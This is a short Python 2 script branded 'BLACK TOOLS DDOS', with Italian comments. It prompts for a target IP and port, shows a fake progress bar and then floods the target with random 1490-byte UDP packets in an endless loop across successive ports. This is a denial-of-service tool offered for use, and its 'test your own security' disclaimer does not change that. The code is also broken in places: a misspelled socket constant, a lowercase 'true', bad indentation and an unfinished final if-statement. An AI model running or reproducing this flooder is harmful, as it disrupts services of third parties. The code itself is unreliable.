import sys
import os
import time
import socket
import random
#codice python
from datetime import datetime
now = datetime.now
 hour = now.hour
 minute =now.minute
 day = now.day
 month = now.month
 year = now.year

 ##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("BLACK TOOLS DDOS")
print
print "AUTORE        : BLACK TOOLS"
print "TEAM          : BLACK TOOLS"
print "AVVERTENZE          : USATE QUESTO TOOL PER TESTARE LA PROPRIA SICUREZZA"
print "TELEGRAM        : BLACK_TOOL"
ip = raw_input("Target IP : ")
port = input("Enter Port      : ")

os.system("clear")
os.system("BLACK TOOLS DDOS")
print "+--                                   + 0% "
time.sleep(2)
print "+-xxxx>                               + 25%"
time.sleep(2)
print "+-xxxxxxxxx>                          + 50%"
time.sleep(3)
print "+-xxxxxxxxxxxxxxxxxx>                 + 75%"
time.sleep(2)
print "+-xxxxxxxxxxxxxxxxxxxxxxxxxxx>        + 100%"
time.sleep(2)
sent = 0
while true:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print "BLACK TOOLS :-sent %s packet to %s throught port:%s"%(sent,ip,port)
    if port == 65534:
